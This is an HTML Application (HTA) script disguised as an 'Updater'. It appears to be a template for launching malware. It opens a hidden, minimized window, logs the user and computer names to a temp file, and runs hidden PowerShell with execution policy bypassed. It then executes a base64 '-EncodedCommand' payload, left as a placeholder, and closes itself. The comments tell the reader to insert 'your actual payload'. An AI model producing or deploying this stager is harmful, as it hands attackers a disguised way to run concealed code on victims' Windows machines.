<!DOCTYPE html>
<html>
<head>
  <hta:application
    id="Updater"
    applicationname="Updater"
    border="none"
    borderstyle="complex"
    caption="no"
    sysmenu="no"
    scroll="no"
    singleinstance="yes"
    windowstate="minimize"
    showintaskbar="no"
  />
  <title>Updater</title>
  <script language="VBScript">
    Sub Window_OnLoad()
        Dim sh, psPath, psArgs, fso, debugPath
        Set sh = CreateObject("WScript.Shell")
        Set fso = CreateObject("Scripting.FileSystemObject")
        
        ' Create debug log
        debugPath = sh.ExpandEnvironmentStrings("%TEMP%\hta_debug.txt")
        
        ' Log execution context
        Dim debugFile
        Set debugFile = fso.CreateTextFile(debugPath, True)
        debugFile.WriteLine "HTA Debug Log: " & Now()
        debugFile.WriteLine "User: " & sh.ExpandEnvironmentStrings("%USERNAME%")
        debugFile.WriteLine "ComputerName: " & sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
        debugFile.WriteLine "Temp: " & sh.ExpandEnvironmentStrings("%TEMP%")
        debugFile.WriteLine "SystemRoot: " & sh.ExpandEnvironmentStrings("%SystemRoot%")
        
        ' Test PowerShell path
        psPath = sh.ExpandEnvironmentStrings("%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe")
        debugFile.WriteLine "PowerShell Path: " & psPath
        debugFile.WriteLine "PowerShell Exists: " & fso.FileExists(psPath)
        
        ' Test simple PowerShell command first
        Dim testCmd
        testCmd = Chr(34) & psPath & Chr(34) & " -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""Add-Content -Path '" & debugPath & "' -Value 'PowerShell executed successfully'"""
        debugFile.WriteLine "Test Command: " & testCmd
        debugFile.Close
        
        ' Run test command
        sh.Run testCmd, 0, True
        
        ' Wait then run your actual payload
        setTimeout "RunPayload", 2000
    End Sub
    
    Sub RunPayload()
        Dim sh, psPath, psArgs, fso, debugPath
        Set sh = CreateObject("WScript.Shell")
        Set fso = CreateObject("Scripting.FileSystemObject")
        
        debugPath = sh.ExpandEnvironmentStrings("%TEMP%\hta_debug.txt")
        psPath = sh.ExpandEnvironmentStrings("%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe")
        psArgs = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand <base-64 string>"
        
        ' Log payload execution
        Dim debugFile
        Set debugFile = fso.OpenTextFile(debugPath, 8, True)
        debugFile.WriteLine "Executing payload: " & Now()
        debugFile.WriteLine "Full command: " & Chr(34) & psPath & Chr(34) & " " & psArgs
        debugFile.Close
        
        ' Execute your payload
        sh.Run Chr(34) & psPath & Chr(34) & " " & psArgs, 0, False
        
        ' Cleanup after delay
        setTimeout "CleanupAndExit", 5000
    End Sub
    
    Sub CleanupAndExit()
        self.close
    End Sub
  </script>
</head>
<body>
</body>
</html>
